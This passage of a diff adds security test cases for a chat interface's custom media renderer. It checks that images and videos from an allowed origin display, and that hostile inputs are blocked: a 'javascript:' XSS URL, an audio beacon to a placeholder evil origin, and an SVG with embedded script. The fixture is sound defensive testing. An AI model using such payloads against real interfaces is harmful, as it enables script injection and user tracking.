+        "markdown": "Attached image: Whiteboard photo.",
+        "name": "km.media",
+        "value": {
+          "messageId": "msg-hostile-1",
+          "mediaId": "m-img-ok",
+          "kind": "image",
+          "url": "{{ALLOWED_ORIGIN}}/media/whiteboard.png",
+          "mimeType": "image/png",
+          "label": "Whiteboard photo"
+        }
+      },
+      "expectedOutcome": "Renders an img with alt 'Whiteboard photo'.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "img[alt='Whiteboard photo']",
+            "count": 1
+          }
+        ],
+        "allowedMediaRequestsMin": 1
+      }
+    },
+    {
+      "id": "media-custom-video-allowed",
+      "category": "media-origin",
+      "title": "km.media video from the allowed origin (control)",
+      "delivery": {
+        "kind": "custom",
+        "markdown": "Attached video: Pricing clip.",
+        "name": "km.media",
+        "value": {
+          "messageId": "msg-hostile-1",
+          "mediaId": "m-vid-ok",
+          "kind": "video",
+          "url": "{{ALLOWED_ORIGIN}}/media/clip.mp4",
+          "mimeType": "video/mp4",
+          "label": "Pricing clip"
+        }
+      },
+      "expectedOutcome": "Renders a video with controls, no autoplay, and an accessible name.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "video[controls]:not([autoplay])",
+            "count": 1
+          }
+        ]
+      }
+    },
+    {
+      "id": "media-custom-audio-disallowed",
+      "category": "media-origin",
+      "title": "km.media audio from a disallowed origin",
+      "delivery": {
+        "kind": "custom",
+        "markdown": "Attached audio: Voice note.",
+        "name": "km.media",
+        "value": {
+          "messageId": "msg-hostile-1",
+          "mediaId": "m-aud-evil",
+          "kind": "audio",
+          "url": "{{EVIL_ORIGIN}}/beacon/custom-audio.wav",
+          "mimeType": "audio/wav",
+          "label": "Voice note"
+        }
+      },
+      "expectedOutcome": "Blocked placeholder; no audio element pointing at the evil origin; zero evil requests.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "[data-testid='km-media-blocked']",
+            "minCount": 1
+          }
+        ]
+      }
+    },
+    {
+      "id": "media-custom-javascript-url",
+      "category": "media-origin",
+      "title": "km.media with a javascript: URL",
+      "delivery": {
+        "kind": "custom",
+        "markdown": "Attached image: Bad image.",
+        "name": "km.media",
+        "value": {
+          "messageId": "msg-hostile-1",
+          "mediaId": "m-js",
+          "kind": "image",
+          "url": "javascript:__kmXss('media-custom-javascript-url')",
+          "mimeType": "image/png",
+          "label": "Bad image"
+        }
+      },
+      "expectedOutcome": "Rejected (schema or allowlist) and shown as blocked; nothing executes.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "[data-testid='km-media-blocked']",
+            "minCount": 1
+          }
+        ]
+      }
+    },
+    {
+      "id": "media-custom-svg-image",
+      "category": "media-origin",
+      "title": "km.media image/svg+xml from the allowed origin containing script",
+      "delivery": {
+        "kind": "custom",
+        "markdown": "Attached image: Diagram.",
+        "name": "km.media",
+        "value": {
+          "messageId": "msg-hostile-1",
+          "mediaId": "m-svg",
+          "kind": "image",
+          "url": "{{ALLOWED_ORIGIN}}/media/hostile.svg",
+          "mimeType": "image/svg+xml",
+          "label": "Diagram"
+        }
+      },
+      "expectedOutcome": "If rendered, only via <img> (scripts in SVG-as-image never run); never inlined into the DOM.",
+      "assert": {
+        "forbiddenSelectors": [
+          "svg script"
+        ]
+      }
+    }
+  ]
+}
